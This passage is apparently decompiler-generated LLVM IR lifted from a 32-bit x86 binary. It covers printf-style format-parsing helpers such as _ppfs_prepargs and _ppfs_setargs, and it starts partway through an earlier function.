  store i32 8, i32* %v1_804e6ea, align 4
  %v0_804e6f0 = load i32, i32* %eax.global-to-local, align 4
  %v1_804e6f0 = add i32 %v0_804e6f0, 4
  store i32 %v1_804e6f0, i32* %eax.global-to-local, align 4
  %v0_804e6f3 = load i32, i32* %edx.global-to-local, align 4
  %v1_804e6f3 = add i32 %v0_804e6f3, -1
  %v8_804e6f3 = icmp eq i32 %v1_804e6f3, 0
  store i32 %v1_804e6f3, i32* %edx.global-to-local, align 4
  %v1_804e6f4 = icmp eq i1 %v8_804e6f3, false
  br i1 %v1_804e6f4, label %dec_label_pc_804e6ea, label %dec_label_pc_804e6f6

dec_label_pc_804e6f6:                             ; preds = %dec_label_pc_804e6ea
  %v0_804e6f6 = load i32, i32* @esi, align 4
  store i32 %v0_804e6f6, i32* %eax.global-to-local, align 4
  %v1_804e72120 = inttoptr i32 %v0_804e6f6 to i8*
  %v2_804e72121 = load i8, i8* %v1_804e72120, align 1
  %v3_804e72122 = zext i8 %v2_804e72121 to i32
  %v5_804e72123 = and i32 %v1_804e6f3, -256
  %v6_804e72124 = or i32 %v3_804e72122, %v5_804e72123
  store i32 %v6_804e72124, i32* %edx.global-to-local, align 4
  %v4_804e72325 = icmp eq i8 %v2_804e72121, 0
  %v1_804e72527 = icmp eq i1 %v4_804e72325, false
  br i1 %v1_804e72527, label %dec_label_pc_804e6ff, label %dec_label_pc_804e727

dec_label_pc_804e6ff:                             ; preds = %dec_label_pc_804e6f6, %dec_label_pc_804e721.backedge
  %v6_804e72130 = phi i32 [ %v6_804e721, %dec_label_pc_804e721.backedge ], [ %v6_804e72124, %dec_label_pc_804e6f6 ]
  %v2_804e72129 = phi i8 [ %v2_804e721, %dec_label_pc_804e721.backedge ], [ %v2_804e72121, %dec_label_pc_804e6f6 ]
  %v0_804e70428 = phi i32 [ %v0_804e704.be, %dec_label_pc_804e721.backedge ], [ %v0_804e6f6, %dec_label_pc_804e6f6 ]
  %v10_804e6ff = icmp eq i8 %v2_804e72129, 37
  %v1_804e702 = icmp eq i1 %v10_804e6ff, false
  br i1 %v1_804e702, label %dec_label_pc_804e720, label %dec_label_pc_804e704

dec_label_pc_804e704:                             ; preds = %dec_label_pc_804e6ff
  %v1_804e704 = add i32 %v0_804e70428, 1
  store i32 %v1_804e704, i32* %eax.global-to-local, align 4
  %v1_804e705 = inttoptr i32 %v1_804e704 to i8*
  %v2_804e705 = load i8, i8* %v1_804e705, align 1
  %v11_804e705 = icmp eq i8 %v2_804e705, 37
  br i1 %v11_804e705, label %dec_label_pc_804e720, label %dec_label_pc_804e70a

dec_label_pc_804e70a:                             ; preds = %dec_label_pc_804e704
  %v1_804e70d = load i32, i32* @ebx, align 4
  %v2_804e70d = inttoptr i32 %v1_804e70d to i32*
  store i32 %v1_804e704, i32* %v2_804e70d, align 4
  %v0_804e70f = load i32, i32* @ebx, align 4
  %v1_804e710 = inttoptr i32 %v0_804e70f to i32*
  %v2_804e710 = call i32 @_ppfs_parsespec(i32* %v1_804e710)
  store i32 %v2_804e710, i32* %eax.global-to-local, align 4
  %v2_804e718 = icmp slt i32 %v2_804e710, 0
  br i1 %v2_804e718, label %dec_label_pc_804e72b, label %dec_label_pc_804e71c

dec_label_pc_804e71c:                             ; preds = %dec_label_pc_804e70a
  %v0_804e71c = load i32, i32* @ebx, align 4
  %v1_804e71c = inttoptr i32 %v0_804e71c to i32*
  %v2_804e71c = load i32, i32* %v1_804e71c, align 4
  %v4_804e721.pre.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_804e721.backedge

dec_label_pc_804e720:                             ; preds = %dec_label_pc_804e704, %dec_label_pc_804e6ff
  %v0_804e720 = phi i32 [ %v1_804e704, %dec_label_pc_804e704 ], [ %v0_804e70428, %dec_label_pc_804e6ff ]
  %v1_804e720 = add i32 %v0_804e720, 1
  br label %dec_label_pc_804e721.backedge

dec_label_pc_804e721.backedge:                    ; preds = %dec_label_pc_804e720, %dec_label_pc_804e71c
  %v4_804e721.be = phi i32 [ %v4_804e721.pre.pre, %dec_label_pc_804e71c ], [ %v6_804e72130, %dec_label_pc_804e720 ]
  %v0_804e704.be = phi i32 [ %v2_804e71c, %dec_label_pc_804e71c ], [ %v1_804e720, %dec_label_pc_804e720 ]
  store i32 %v0_804e704.be, i32* %eax.global-to-local, align 4
  %v1_804e721 = inttoptr i32 %v0_804e704.be to i8*
  %v2_804e721 = load i8, i8* %v1_804e721, align 1
  %v3_804e721 = zext i8 %v2_804e721 to i32
  %v5_804e721 = and i32 %v4_804e721.be, -256
  %v6_804e721 = or i32 %v3_804e721, %v5_804e721
  store i32 %v6_804e721, i32* %edx.global-to-local, align 4
  %v4_804e723 = icmp eq i8 %v2_804e721, 0
  %v1_804e725 = icmp eq i1 %v4_804e723, false
  br i1 %v1_804e725, label %dec_label_pc_804e6ff, label %dec_label_pc_804e721.dec_label_pc_804e727_crit_edge

dec_label_pc_804e721.dec_label_pc_804e727_crit_edge: ; preds = %dec_label_pc_804e721.backedge
  %v0_804e727.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804e727

dec_label_pc_804e727:                             ; preds = %dec_label_pc_804e721.dec_label_pc_804e727_crit_edge, %dec_label_pc_804e6f6
  %v0_804e727 = phi i32 [ %v0_804e727.pre, %dec_label_pc_804e721.dec_label_pc_804e727_crit_edge ], [ %v0_804e6f6, %dec_label_pc_804e6f6 ]
  %v1_804e727 = load i32, i32* @ebx, align 4
  %v2_804e727 = inttoptr i32 %v1_804e727 to i32*
  store i32 %v0_804e727, i32* %v2_804e727, align 4
  br label %dec_label_pc_804e72b

dec_label_pc_804e72b:                             ; preds = %dec_label_pc_804e70a, %dec_label_pc_804e727
  %storemerge = phi i32 [ 0, %dec_label_pc_804e727 ], [ -1, %dec_label_pc_804e70a ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  %v2_804e72b = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804e72b, i32* @edx, align 4
  %v2_804e72c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804e72c, i32* @ebx, align 4
  store i32 %v0_804e6c0, i32* @esi, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v6_804e721, { 1, 0 }
  uselistorder i8 %v2_804e721, { 1, 2, 0 }
  uselistorder i32 %v0_804e704.be, { 2, 1, 0 }
  uselistorder i32 %v0_804e70428, { 1, 0 }
  uselistorder i32 %v0_804e6f6, { 1, 0, 2, 3 }
  uselistorder i32 %v1_804e6f3, { 0, 2, 1 }
  uselistorder i32 %v1_804e6f0, { 1, 0 }
  uselistorder i32* %edx.global-to-local, { 0, 4, 1, 2, 3 }
  uselistorder i32* %eax.global-to-local, { 1, 0, 2, 3, 8, 4, 5, 6, 7 }
  uselistorder label %dec_label_pc_804e72b, { 1, 0 }
  uselistorder label %dec_label_pc_804e6ff, { 1, 0 }
}

define i32 @_ppfs_prepargs(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v0_804e730 = load i32, i32* @esi, align 4
  %v0_804e731 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v1_804e73d = add i32 %arg1, 24
  %v2_804e73d = inttoptr i32 %v1_804e73d to i32*
  %v3_804e73d = load i32, i32* %v2_804e73d, align 4
  %v2_804e740 = add i32 %arg1, 76
  %v3_804e740 = inttoptr i32 %v2_804e740 to i32*
  store i32 %arg2, i32* %v3_804e740, align 4
  %tmp8 = icmp slt i32 %v3_804e73d, 1
  br i1 %tmp8, label %dec_label_pc_804e76e, label %dec_label_pc_804e747

dec_label_pc_804e747:                             ; preds = %entry
  %v1_804e74a = load i32, i32* @ebx, align 4
  %v2_804e74a = add i32 %v1_804e74a, 28
  %v3_804e74a = inttoptr i32 %v2_804e74a to i32*
  store i32 %v3_804e73d, i32* %v3_804e74a, align 4
  %v0_804e74d = load i32, i32* @ebx, align 4
  %v1_804e74d = add i32 %v0_804e74d, 24
  %v2_804e74d = inttoptr i32 %v1_804e74d to i32*
  store i32 0, i32* %v2_804e74d, align 4
  %v0_804e754 = load i32, i32* @ebx, align 4
  %v1_804e754 = add i32 %v0_804e754, 4
  %v2_804e754 = inttoptr i32 %v1_804e754 to i32*
  store i32 0, i32* %v2_804e754, align 4
  %v0_804e75b = load i32, i32* @ebx, align 4
  %v1_804e75b = add i32 %v0_804e75b, 8
  %v2_804e75b = inttoptr i32 %v1_804e75b to i32*
  store i32 0, i32* %v2_804e75b, align 4
  %v0_804e762 = load i32, i32* @ebx, align 4
  %v1_804e763 = call i32 @_ppfs_setargs(i32 %v0_804e762)
  %v1_804e76b = load i32, i32* @ebx, align 4
  %v2_804e76b = add i32 %v1_804e76b, 24
  %v3_804e76b = inttoptr i32 %v2_804e76b to i32*
  store i32 %v3_804e73d, i32* %v3_804e76b, align 4
  br label %dec_label_pc_804e76e

dec_label_pc_804e76e:                             ; preds = %entry, %dec_label_pc_804e747
  %v2_804e76e = load i32, i32* %stack_var_-12, align 4
  store i32 %v0_804e731, i32* @ebx, align 4
  store i32 %v0_804e730, i32* @esi, align 4
  ret i32 %v2_804e76e

; uselistorder directives
  uselistorder i32 %v3_804e73d, { 1, 2, 0 }
  uselistorder i32 (i32)* @_ppfs_setargs, { 1, 0 }
  uselistorder i32 %arg1, { 0, 2, 1 }
  uselistorder label %dec_label_pc_804e76e, { 1, 0 }
}

define i32 @_ppfs_setargs(i32 %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_804e775 = load i32, i32* @ebx, align 4
  store i32 %v0_804e775, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* @ecx, align 4
  %v1_804e77a = add i32 %arg1, 24
  %v2_804e77a = inttoptr i32 %v1_804e77a to i32*
  %v3_804e77a = load i32, i32* %v2_804e77a, align 4
  %v4_804e77a = icmp eq i32 %v3_804e77a, 0
  %v1_804e77e = add i32 %arg1, 80
  store i32 %v1_804e77e, i32* %ebx.global-to-local, align 4
  %v1_804e781 = icmp eq i1 %v4_804e77a, false
  %v1_804e839 = add i32 %arg1, 8
  %v2_804e839 = inttoptr i32 %v1_804e839 to i32*
  %v3_804e839 = load i32, i32* %v2_804e839, align 4
  %v8_804e839 = icmp eq i32 %v3_804e839, -2147483648
  %v1_804e840 = icmp eq i1 %v8_804e839, false
  br i1 %v1_804e781, label %dec_label_pc_804e839, label %dec_label_pc_804e787

dec_label_pc_804e787:                             ; preds = %entry
  br i1 %v1_804e840, label %dec_label_pc_804e7a1, label %dec_label_pc_804e790

dec_label_pc_804e790:                             ; preds = %dec_label_pc_804e787
  %v1_804e790 = add i32 %arg1, 76
  %v2_804e790 = inttoptr i32 %v1_804e790 to i32*
  %v3_804e790 = load i32, i32* %v2_804e790, align 4
  store i32 %v3_804e790, i32* %eax.global-to-local, align 4
  %v1_804e793 = add i32 %v3_804e790, 4
  store i32 %v1_804e793, i32* %edx.global-to-local, align 4
  store i32 %v1_804e793, i32* %v2_804e790, align 4
  %v0_804e799 = load i32, i32* %eax.global-to-local, align 4
  %v1_804e799 = inttoptr i32 %v0_804e799 to i32*
  %v2_804e799 = load i32, i32* %v1_804e799, align 4
  store i32 %v2_804e799, i32* %eax.global-to-local, align 4
  %v1_804e79b = load i32, i32* @ecx, align 4
  %v2_804e79b = add i32 %v1_804e79b, 80
  %v3_804e79b = inttoptr i32 %v2_804e79b to i32*
  store i32 %v2_804e799, i32* %v3_804e79b, align 4
  %v0_804e79e = load i32, i32* %eax.global-to-local, align 4
  %v1_804e79e = load i32, i32* @ecx, align 4
  %v2_804e79e = add i32 %v1_804e79e, 8
  %v3_804e79e = inttoptr i32 %v2_804e79e to i32*
  store i32 %v0_804e79e, i32* %v3_804e79e, align 4
  %v0_804e7a1.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_804e7a1

dec_label_pc_804e7a1:                             ; preds = %dec_label_pc_804e787, %dec_label_pc_804e790
  %v1_804e7b0 = phi i32 [ %arg1, %dec_label_pc_804e787 ], [ %v0_804e7a1.pre, %dec_label_pc_804e790 ]
  %v1_804e7a1 = add i32 %v1_804e7b0, 4
  %v2_804e7a1 = inttoptr i32 %v1_804e7a1 to i32*
  %v3_804e7a1 = load i32, i32* %v2_804e7a1, align 4
  %v8_804e7a1 = icmp eq i32 %v3_804e7a1, -2147483648
  %v1_804e7a8 = icmp eq i1 %v8_804e7a1, false
  br i1 %v1_804e7a8, label %dec_label_pc_804e7bb, label %dec_label_pc_804e7aa

dec_label_pc_804e7aa:                             ; preds = %dec_label_pc_804e7a1
  %v1_804e7aa = add i32 %v1_804e7b0, 76
  %v2_804e7aa = inttoptr i32 %v1_804e7aa to i32*
  %v3_804e7aa = load i32, i32* %v2_804e7aa, align 4
  store i32 %v3_804e7aa, i32* %eax.global-to-local, align 4
  %v1_804e7ad = add i32 %v3_804e7aa, 4
  store i32 %v1_804e7ad, i32* %edx.global-to-local, align 4
  store i32 %v1_804e7ad, i32* %v2_804e7aa, align 4
  %v0_804e7b3 = load i32, i32* %eax.global-to-local, align 4
  %v1_804e7b3 = inttoptr i32 %v0_804e7b3 to i32*
  %v2_804e7b3 = load i32, i32* %v1_804e7b3, align 4
  store i32 %v2_804e7b3, i32* %eax.global-to-local, align 4
  %v1_804e7b5 = load i32, i32* @ecx, align 4
  %v2_804e7b5 = add i32 %v1_804e7b5, 80
  %v3_804e7b5 = inttoptr i32 %v2_804e7b5 to i32*
  store i32 %v2_804e7b3, i32* %v3_804e7b5, align 4
  %v0_804e7b8 = load i32, i32* %eax.global-to-local, align 4
  %v1_804e7b8 = load i32, i32* @ecx, align 4
  %v2_804e7b8 = add i32 %v1_804e7b8, 4
  %v3_804e7b8 = inttoptr i32 %v2_804e7b8 to i32*
  store i32 %v0_804e7b8, i32* %v3_804e7b8, align 4
  %v1_804e83215.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_804e7bb

dec_label_pc_804e7bb:                             ; preds = %dec_label_pc_804e7a1, %dec_label_pc_804e7aa
  %v1_804e83215 = phi i32 [ %v1_804e7b0, %dec_label_pc_804e7a1 ], [ %v1_804e83215.pre, %dec_label_pc_804e7aa ]
  store i32 0, i32* %esi.global-to-local, align 4
  %v2_804e83216 = add i32 %v1_804e83215, 28
  %v3_804e83217 = inttoptr i32 %v2_804e83216 to i32*
  %v4_804e83218 = load i32, i32* %v3_804e83217, align 4
  %v5_804e83520 = icmp sgt i32 %v4_804e83218, 0
  br i1 %v5_804e83520, label %dec_label_pc_804e7bf, label %dec_label_pc_804e867.loopexit

dec_label_pc_804e7bf:                             ; preds = %dec_label_pc_804e7bb, %dec_label_pc_804e831
  %v1_804e83222 = phi i32 [ %v1_804e832, %dec_label_pc_804e831 ], [ %v1_804e83215, %dec_label_pc_804e7bb ]
  %v1_804e7bf21 = phi i32 [ %v1_804e831, %dec_label_pc_804e831 ], [ 0, %dec_label_pc_804e7bb ]
  %v2_804e7bf = mul i32 %v1_804e7bf21, 4
  %v3_804e7bf = add i32 %v2_804e7bf, 40
  %v4_804e7bf = add i32 %v3_804e7bf, %v1_804e83222
  %v5_804e7bf = inttoptr i32 %v4_804e7bf to i32*
  %v6_804e7bf = load i32, i32* %v5_804e7bf, align 4
  store i32 %v6_804e7bf, i32* %eax.global-to-local, align 4
  %v1_804e7c3 = add i32 %v6_804e7bf, -8
  %v9_804e7c3 = icmp eq i32 %v1_804e7c3, 0
  br i1 %v9_804e7c3, label %dec_label_pc_804e831, label %dec_label_pc_804e7c8

dec_label_pc_804e7c8:                             ; preds = %dec_label_pc_804e7bf
  %v10_804e7c3 = icmp slt i32 %v1_804e7c3, 0
  %v6_804e7c3 = sub i32 7, %v6_804e7bf
  %v7_804e7c3 = and i32 %v6_804e7c3, %v6_804e7bf
  %v8_804e7c3 = icmp slt i32 %v7_804e7c3, 0
  %v1_804e7c8 = add i32 %v1_804e83222, 76
  %v2_804e7c8 = inttoptr i32 %v1_804e7c8 to i32*
  %v3_804e7c8 = load i32, i32* %v2_804e7c8, align 4
  store i32 %v3_804e7c8, i32* %edx.global-to-local, align 4
  %v3_804e7cb = icmp eq i1 %v10_804e7c3, %v8_804e7c3
  br i1 %v3_804e7cb, label %dec_label_pc_804e7db, label %dec_label_pc_804e7cd

dec_label_pc_804e7cd:                             ; preds = %dec_label_pc_804e7c8
  %tmp13 = icmp slt i32 %v6_804e7bf, 3
  %v9_804e7d4 = icmp eq i32 %v6_804e7bf, 7
  %v1_804e7d7 = icmp eq i1 %v9_804e7d4, false
  %or.cond = or i1 %tmp13, %v1_804e7d7
  br i1 %or.cond, label %dec_label_pc_804e824, label %dec_label_pc_804e806

dec_label_pc_804e7db:                             ; preds = %dec_label_pc_804e7c8
  %tmp14 = icmp sgt i32 %v6_804e7bf, 1024
  br i1 %tmp14, label %dec_label_pc_804e7e4, label %dec_label_pc_804e824

dec_label_pc_804e7e4:                             ; preds = %dec_label_pc_804e7db
  %v6_804e7e4 = icmp eq i32 %v6_804e7bf, 2048
  br i1 %v6_804e7e4, label %dec_label_pc_804e7f4, label %dec_label_pc_804e7eb

dec_label_pc_804e7eb:                             ; preds = %dec_label_pc_804e7e4
  %v9_804e7eb = icmp eq i32 %v6_804e7bf, 2055
  %v1_804e7f0 = icmp eq i1 %v9_804e7eb, false
  br i1 %v1_804e7f0, label %dec_label_pc_804e824, label %dec_label_pc_804e815

dec_label_pc_804e7f4:                             ; preds = %dec_label_pc_804e7e4
  %v1_804e7f4 = add i32 %v3_804e7c8, 8
  store i32 %v1_804e7f4, i32* %eax.global-to-local, align 4
  store i32 %v1_804e7f4, i32* %v2_804e7c8, align 4
  %v0_804e7fa = load i32, i32* %edx.global-to-local, align 4
  %v1_804e7fa = inttoptr i32 %v0_804e7fa to i32*
  %v2_804e7fa = load i32, i32* %v1_804e7fa, align 4
  store i32 %v2_804e7fa, i32* %eax.global-to-local, align 4
  %v1_804e7fc = add i32 %v0_804e7fa, 4
  %v2_804e7fc = inttoptr i32 %v1_804e7fc to i32*
  %v3_804e7fc = load i32, i32* %v2_804e7fc, align 4
  store i32 %v3_804e7fc, i32* %edx.global-to-local, align 4
  %v1_804e7ff = load i32, i32* %ebx.global-to-local, align 4
  %v2_804e7ff = inttoptr i32 %v1_804e7ff to i32*
  store i32 %v2_804e7fa, i32* %v2_804e7ff, align 4
  %v0_804e801 = load i32, i32* %edx.global-to-local, align 4
  %v1_804e801 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804e801 = add i32 %v1_804e801, 4
  %v3_804e801 = inttoptr i32 %v2_804e801 to i32*
  store i32 %v0_804e801, i32* %v3_804e801, align 4
  br label %dec_label_pc_804e82e

dec_label_pc_804e806:                             ; preds = %dec_label_pc_804e7cd
  %v3_804e806 = load i32, i32* %v2_804e7c8, align 4
  store i32 %v3_804e806, i32* %edx.global-to-local, align 4
  %v1_804e809 = add i32 %v3_804e806, 8
  store i32 %v1_804e809, i32* %eax.global-to-local, align 4
  store i32 %v1_804e809, i32* %v2_804e7c8, align 4
  %v0_804e80f = load i32, i32* %edx.global-to-local, align 4
  %v1_804e80f = inttoptr i32 %v0_804e80f to double*
  %v2_804e80f = load double, double* %v1_804e80f, align 4
  %v2_804e811 = load i32, i32* %ebx.global-to-local, align 4
  %v4_804e811 = inttoptr i32 %v2_804e811 to double*
  store double %v2_804e80f, double* %v4_804e811, align 4
  br label %dec_label_pc_804e82e

dec_label_pc_804e815:                             ; preds = %dec_label_pc_804e7eb
  %v3_804e815 = load i32, i32* %v2_804e7c8, align 4
  store i32 %v3_804e815, i32* %edx.global-to-local, align 4
  %v1_804e818 = add i32 %v3_804e815, 12
  store i32 %v1_804e818, i32* %eax.global-to-local, align 4
  store i32 %v1_804e818, i32* %v2_804e7c8, align 4
  %v0_804e81e = load i32, i32* %edx.global-to-local, align 4
  %v1_804e81e = inttoptr i32 %v0_804e81e to x86_fp80*
  %v2_804e81e = load x86_fp80, x86_fp80* %v1_804e81e, align 4
  %v2_804e820 = load i32, i32* %ebx.global-to-local, align 4
  %v3_804e820 = inttoptr i32 %v2_804e820 to x86_fp80*
  store x86_fp80 %v2_804e81e, x86_fp80* %v3_804e820, align 4
  br label %dec_label_pc_804e82e

dec_label_pc_804e824:                             ; preds = %dec_label_pc_804e7cd, %dec_label_pc_804e7db, %dec_label_pc_804e7eb
  %v1_804e824 = add i32 %v3_804e7c8, 4
  store i32 %v1_804e824, i32* %eax.global-to-local, align 4
  store i32 %v1_804e824, i32* %v2_804e7c8, align 4
  %v0_804e82a = load i32, i32* %edx.global-to-local, align 4
  %v1_804e82a = inttoptr i32 %v0_804e82a to i32*
  %v2_804e82a = load i32, i32* %v1_804e82a, align 4
  store i32 %v2_804e82a, i32* %eax.global-to-local, align 4
  %v1_804e82c = load i32, i32* %ebx.global-to-local, align 4
  %v2_804e82c = inttoptr i32 %v1_804e82c to i32*
  store i32 %v2_804e82a, i32* %v2_804e82c, align 4
  br label %dec_label_pc_804e82e

dec_label_pc_804e82e:                             ; preds = %dec_label_pc_804e815, %dec_label_pc_804e806, %dec_label_pc_804e7f4, %dec_label_pc_804e824
  %v0_804e82e = load i32, i32* %ebx.global-to-local, align 4
  %v1_804e82e = add i32 %v0_804e82e, 12
  store i32 %v1_804e82e, i32* %ebx.global-to-local, align 4
  %v0_804e831.pre = load i32, i32* %esi.global-to-local, align 4
  %v1_804e832.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_804e831

dec_label_pc_804e831:                             ; preds = %dec_label_pc_804e7bf, %dec_label_pc_804e82e
  %v1_804e832 = phi i32 [ %v1_804e83222, %dec_label_pc_804e7bf ], [ %v1_804e832.pre, %dec_label_pc_804e82e ]
  %v0_804e831 = phi i32 [ %v1_804e7bf21, %dec_label_pc_804e7bf ], [ %v0_804e831.pre, %dec_label_pc_804e82e ]
  %v1_804e831 = add i32 %v0_804e831, 1
  store i32 %v1_804e831, i32* %esi.global-to-local, align 4
  %v2_804e832 = add i32 %v1_804e832, 28
  %v3_804e832 = inttoptr i32 %v2_804e832 to i32*
  %v4_804e832 = load i32, i32* %v3_804e832, align 4
  %v5_804e835 = icmp slt i32 %v1_804e831, %v4_804e832
  br i1 %v5_804e835, label %dec_label_pc_804e7bf, label %dec_label_pc_804e832.dec_label_pc_804e867.loopexit_crit_edge

dec_label_pc_804e839:                             ; preds = %entry
  br i1 %v1_804e840, label %dec_label_pc_804e850, label %dec_label_pc_804e842

dec_label_pc_804e842:                             ; preds = %dec_label_pc_804e839
  %v1_804e842 = add i32 %arg1, 36
  %v2_804e842 = inttoptr i32 %v1_804e842 to i8*
  %v3_804e842 = load i8, i8* %v2_804e842, align 1
  %v2_804e846 = zext i8 %v3_804e842 to i32
  %v3_804e846 = mul nuw nsw i32 %v2_804e846, 12
  store i32 %v3_804e846, i32* %eax.global-to-local, align 4
  %v2_804e849 = add i32 %arg1, 68
  %v3_804e849 = add i32 %v2_804e849, %v3_804e846
  %v4_804e849 = inttoptr i32 %v3_804e849 to i32*
  %v5_804e849 = load i32, i32* %v4_804e849, align 4
  store i32 %v5_804e849, i32* %eax.global-to-local, align 4
  store i32 %v5_804e849, i32* %v2_804e839, align 4
  %v0_804e850.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_804e850

dec_label_pc_804e850:                             ; preds = %dec_label_pc_804e839, %dec_label_pc_804e842
  %v1_804e864 = phi i32 [ %arg1, %dec_label_pc_804e839 ], [ %v0_804e850.pre, %dec_label_pc_804e842 ]
  %v1_804e850 = add i32 %v1_804e864, 4
  %v2_804e850 = inttoptr i32 %v1_804e850 to i32*
  %v3_804e850 = load i32, i32* %v2_804e850, align 4
  %v8_804e850 = icmp eq i32 %v3_804e850, -2147483648
  %v1_804e857 = icmp eq i1 %v8_804e850, false
  br i1 %v1_804e857, label %dec_label_pc_804e867, label %dec_label_pc_804e859

dec_label_pc_804e859:                             ; preds = %dec_label_pc_804e850
  %v1_804e859 = add i32 %v1_804e864, 37
  %v2_804e859 = inttoptr i32 %v1_804e859 to i8*
  %v3_804e859 = load i8, i8* %v2_804e859, align 1
  %v2_804e85d = zext i8 %v3_804e859 to i32
  %v3_804e85d = mul nuw nsw i32 %v2_804e85d, 12
  store i32 %v3_804e85d, i32* %eax.global-to-local, align 4
  %v1_804e860 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804e860 = add nsw i32 %v3_804e85d, -12
  %v3_804e860 = add i32 %v2_804e860, %v1_804e860
  %v4_804e860 = inttoptr i32 %v3_804e860 to i32*
  %v5_804e860 = load i32, i32* %v4_804e860, align 4
  store i32 %v5_804e860, i32* %eax.global-to-local, align 4
  store i32 %v5_804e860, i32* %v2_804e850, align 4
  %v0_804e867.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_804e867

dec_label_pc_804e832.dec_label_pc_804e867.loopexit_crit_edge: ; preds = %dec_label_pc_804e831
  br label %dec_label_pc_804e867.loopexit

dec_label_pc_804e867.loopexit:                    ; preds = %dec_label_pc_804e832.dec_label_pc_804e867.loopexit_crit_edge, %dec_label_pc_804e7bb
  %v1_804e832.lcssa = phi i32 [ %v1_804e832, %dec_label_pc_804e832.dec_label_pc_804e867.loopexit_crit_edge ], [ %v1_804e83215, %dec_label_pc_804e7bb ]
  br label %dec_label_pc_804e867

dec_label_pc_804e867:                             ; preds = %dec_label_pc_804e867.loopexit, %dec_label_pc_804e850, %dec_label_pc_804e859
  %v10_804e86e = phi i32 [ %v1_804e832.lcssa, %dec_label_pc_804e867.loopexit ], [ %v1_804e864, %dec_label_pc_804e850 ], [ %v0_804e867.pre, %dec_label_pc_804e859 ]
  %v1_804e867 = add i32 %v10_804e86e, 8
  %v2_804e867 = inttoptr i32 %v1_804e867 to i32*
  %v3_804e867 = load i32, i32* %v2_804e867, align 4
  store i32 %v3_804e867, i32* %eax.global-to-local, align 4
  %v2_804e86a = icmp slt i32 %v3_804e867, 0
  %v1_804e86c = icmp eq i1 %v2_804e86a, false
  br i1 %v1_804e86c, label %dec_label_pc_804e882, label %dec_label_pc_804e86e

dec_label_pc_804e86e:                             ; preds = %dec_label_pc_804e867
  %v1_804e86e = add i32 %v10_804e86e, 16
  %v2_804e86e = inttoptr i32 %v1_804e86e to i32*
  %v3_804e86e = load i32, i32* %v2_804e86e, align 4
  %v4_804e86e = or i32 %v3_804e86e, 8
  store i32 %v4_804e86e, i32* %v2_804e86e, align 4
  %v0_804e872 = load i32, i32* %eax.global-to-local, align 4
  %v1_804e872 = sub i32 0, %v0_804e872
  store i32 %v1_804e872, i32* %eax.global-to-local, align 4
  %v1_804e874 = load i32, i32* @ecx, align 4
  %v2_804e874 = add i32 %v1_804e874, 8
  %v3_804e874 = inttoptr i32 %v2_804e874 to i32*
  store i32 %v1_804e872, i32* %v3_804e874, align 4
  %v0_804e877 = load i32, i32* @ecx, align 4
  %v1_804e877 = add i32 %v0_804e877, 16
  %v2_804e877 = inttoptr i32 %v1_804e877 to i32*
  %v3_804e877 = load i32, i32* %v2_804e877, align 4
  %v4_804e877 = and i32 %v3_804e877, -2
  store i32 %v4_804e877, i32* %v2_804e877, align 4
  %v0_804e87b = load i32, i32* @ecx, align 4
  %v1_804e87b = add i32 %v0_804e87b, 20
  %v2_804e87b = inttoptr i32 %v1_804e87b to i32*
  store i32 32, i32* %v2_804e87b, align 4
  %v0_804e884.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e882

dec_label_pc_804e882:                             ; preds = %dec_label_pc_804e867, %dec_label_pc_804e86e
  %v0_804e884 = phi i32 [ %v3_804e867, %dec_label_pc_804e867 ], [ %v0_804e884.pre, %dec_label_pc_804e86e ]
  %v2_804e882 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804e882, i32* @ebx, align 4
  ret i32 %v0_804e884

; uselistorder directives
  uselistorder i32 %v3_804e85d, { 1, 0 }
  uselistorder i32 %v3_804e846, { 1, 0 }
  uselistorder i32 %v1_804e831, { 2, 1, 0 }
  uselistorder i32 %v1_804e832, { 1, 2, 0 }
  uselistorder i32 %v3_804e7c8, { 1, 0, 2 }
  uselistorder i32* %v2_804e7c8, { 1, 2, 3, 4, 5, 0, 6 }
  uselistorder i32 %v1_804e7c3, { 1, 0 }
  uselistorder i32 %v6_804e7bf, { 3, 4, 5, 2, 1, 0, 7, 6, 8 }
  uselistorder i32 %v1_804e7bf21, { 1, 0 }
  uselistorder i32 %v1_804e83215, { 2, 0, 1 }
  uselistorder i1 %v1_804e840, { 1, 0 }
  uselistorder i32* %edx.global-to-local, { 6, 0, 1, 2, 3, 4, 5, 7, 8, 9, 10 }
  uselistorder i32* %ebx.global-to-local, { 1, 0, 2, 3, 4, 5, 6, 7, 8 }
  uselistorder i32 -12, { 23, 1, 9, 5, 2, 6, 7, 8, 10, 11, 3, 21, 12, 22, 0, 20, 14, 13, 15, 4, 16, 17, 18, 19, 25, 24, 26 }
  uselistorder i32 37, { 3, 4, 2, 0, 1 }
  uselistorder i32 7, { 0, 5, 6, 7, 8, 9, 10, 11, 12, 1, 3, 4, 2 }
  uselistorder i32 -8, { 20, 0, 7, 2, 3, 4, 5, 6, 8, 9, 10, 11, 19, 13, 12, 14, 1, 15, 16, 17, 18, 21, 22, 23 }
  uselistorder i32 76, { 1, 2, 3, 4, 0 }
  uselistorder i32 %arg1, { 1, 0, 2, 3, 4, 6, 5, 8, 7 }
  uselistorder label %dec_label_pc_804e882, { 1, 0 }
  uselistorder label %dec_label_pc_804e867, { 0, 2, 1 }
  uselistorder label %dec_label_pc_804e850, { 1, 0 }
